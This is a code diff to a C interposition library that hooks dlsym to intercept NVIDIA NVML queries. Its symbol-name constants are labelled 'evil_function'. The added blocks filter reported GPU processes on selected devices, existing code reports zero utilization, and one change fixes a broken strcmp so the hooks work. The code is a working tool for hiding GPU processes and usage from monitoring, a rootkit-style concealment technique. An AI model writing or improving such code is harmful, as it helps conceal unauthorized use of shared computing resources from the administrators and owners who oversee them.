@@ -85,6 +85,24 @@ nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device
 	return r;
   }
 
+
+  {
+	int hide = 0;
+	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
+	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
+	unsigned int index = -1;
+	nvmlReturn_t ridx = realIndex(device, &index);
+	if (ridx != NVML_SUCCESS) {
+	  return ridx;
+	}
+	for (int i = 0;
+		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
+		 i++) {
+	  if (index == hide_GPU_Index[i])hide = 1;
+	}
+	if (!hide)return NVML_SUCCESS;
+  }
+
   int count = 0;
   while (count < *infoCount) {
 	uint pid = (infos + count)->pid;
@@ -155,6 +173,25 @@ nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *
 	  return r;
 	}
 
+
+
+	{
+	  int hide = 0;
+	  nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
+	  realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
+	  unsigned int index = -1;
+	  nvmlReturn_t ridx = realIndex(device, &index);
+	  if (ridx != NVML_SUCCESS) {
+		return ridx;
+	  }
+	  for (int i = 0;
+		   sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
+		   i++) {
+		if (index == hide_GPU_Index[i])hide = 1;
+	  }
+	  if (!hide)return NVML_SUCCESS;
+	}
+
 	int count = 0;
 	while (count < *infoCountGraph) {
 	  uint pid = (infos + count)->pid;
@@ -182,17 +219,18 @@ nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *
   return NVML_SUCCESS;
 }
 
-
 /**
  * Utilization information for a device.
  * Each sample period may be between 1 second and 1/6 second, depending on the product being queried.
  */
-typedef struct nvmlUtilization_st
-{
-  unsigned int gpu;                //!< Percent of time over the past sample period during which one or more kernels was executing on the GPU
-  unsigned int memory;             //!< Percent of time over the past sample period during which global (device) memory was being read or written
+typedef struct nvmlUtilization_st {
+  unsigned int
+	  gpu;                //!< Percent of time over the past sample period during which one or more kernels was executing on the GPU
+  unsigned int
+	  memory;             //!< Percent of time over the past sample period during which global (device) memory was being read or written
 } nvmlUtilization_t;
-nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization){
+nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device,
+												   nvmlUtilization_t *utilization) {
   utilization->memory = 0;
   utilization->gpu = 0;
   return NVML_SUCCESS;
@@ -201,6 +239,7 @@ nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtil
 nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device,
 															  unsigned int *infoCount,
 															  nvmlProcessInfo_t *infos) {
+
   void *handle;
   char *error;
   handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
@@ -218,6 +257,23 @@ nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t devic
   nvmlReturn_t r = realopen(device, infoCount, infos);
   if (r != NVML_SUCCESS) {
 	return r;
+  }
+
+  {
+    int hide = 0;
+	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
+	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
+	unsigned int index = -1;
+	nvmlReturn_t ridx = realIndex(device, &index);
+	if (ridx != NVML_SUCCESS) {
+	  return ridx;
+	}
+	for (int i = 0;
+		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
+		 i++) {
+	  if (index == hide_GPU_Index[i])hide = 1;
+	}
+	if (!hide)return NVML_SUCCESS;
   }
 
   int count = 0;
@@ -253,7 +309,6 @@ const char *evil_function2 = "nvmlDeviceGetGraphicsRunningProcesses_v2";
 const char *evil_function3 = "nvmlDeviceGetMemoryInfo";
 const char *evil_function4 = "nvmlDeviceGetUtilizationRates";
 
-
 extern void *_dl_sym(void *, const char *, void *);
 extern void *dlsym(void *handle, const char *name) {
   static void *(*real_dlsym)(void *, const char *) =NULL;
@@ -271,9 +326,9 @@ extern void *dlsym(void *handle, const char *name) {
   } else if (strcmp(name, evil_function3) == 0) {
 	void *result = nvmlDeviceGetMemoryInfo;
 	return result;
-  }else if (strcmp(name,evil_function4)){
-    void * result = nvmlDeviceGetUtilizationRates;
-    return result;
+  } else if (strcmp(name, evil_function4) == 0) {
+	void *result = nvmlDeviceGetUtilizationRates;
+	return result;
   }
   return real_dlsym(handle, name);
 }
